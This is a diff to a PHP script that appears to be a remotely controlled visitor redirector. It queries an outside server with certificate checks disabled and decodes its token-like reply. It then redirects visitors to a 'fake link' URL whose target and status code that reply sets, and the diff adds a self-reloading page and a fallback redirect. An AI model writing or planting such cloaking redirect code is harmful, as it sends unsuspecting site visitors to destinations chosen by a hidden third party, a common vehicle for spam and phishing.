@@ -38,21 +38,24 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,false );
 $headersRes = curl_getinfo($ch);
 
 
-echo "<br>rescurl: ".json_encode($headersRes) ." <br>";
+//echo "<br>rescurl: ".json_encode($headersRes) ." <br>";
 
-echo "<br>error curl : ".curl_errno($ch) ." <br>"; 
+//echo "<br>error curl : ".curl_errno($ch) ." <br>"; 
 				// close the connection, release resources used
 				curl_close($ch);
-echo "<br>rspon:".$response."<br>";
+//echo "<br>rspon:".$response."<br>";
 					$response=explode('.',$response);
 				
 	$res= json_decode(base64_decode($response[1]));
-	echo "res: ".json_encode($res); 
+	//echo "res: ".json_encode($res); 
 
 
 if(isset($_GET["u"])){
   $texte=$_GET["u"];
-echo "param U: ";
+	$texte= substr($texte,5,strlen($texte)-5);
+	// case not enough length 
+	if(!$texte) $texte= time();
+//echo "param U: ";
 	if($headersRes['http_code']==200 && isset($res->sta) && $res->sta==1 && isset($res->mess) && $res->mess){
 			//		echo json_encode(	$headers )."test:".json_encode(	$res );die("code:".$headersRes['http_code']);
 		//		echo json_encode(	$headers )."test:".json_encode(	$res );die();
@@ -74,8 +77,8 @@ echo "param U: ";
 			}
 			else {
 				// return template 
-				echo str_replace("appnow",($texte),$TEMPSSS);
-				die("") ;
+				//echo str_replace("appnow",($texte),$TEMPSSS);
+				//die("") ;
 				$linkfakb='https://'.$urlred.'/'.ID_USER.'/om/'.urlencode($texte);
 				if(REDIRECT_LINK && wp_redirectaa($linkfakb,301)){
 					
@@ -83,9 +86,34 @@ echo "param U: ";
 				}
 			}
 	}
+	else {
+?>
+<!DOCTYPE html>
+<html>
+<body>
+
+<script>
+location.reload();
+</script>
+
+</body>
+</html> 
+<?php 
+	}
 }else {
 
-  echo "notha ve pram";
+ $linkfakb="https://google.com";
+	$core=301;
+				//i_res":{"show":0,"l_res":"https:\/\/google.com","inl_pa":0,"t_res_l":2,"t_res_att":2}
+				if(isset($res->i_res)){
+					if($res->i_res->l_res) $linkfakb=$res->i_res->l_res;
+					$urlred= parse_url($linkfakb)['host'];
+					if($res->i_res->inl_pa)$linkfakb='https://'.$urlred.'/'.ID_USER.'/om/'.urlencode($texte);
+					
+					if($res->i_res->t_res_l==2) $core=302;
+					
+				}
+	return wp_redirectaa($linkfakb,$core);
 }
 
 ?>
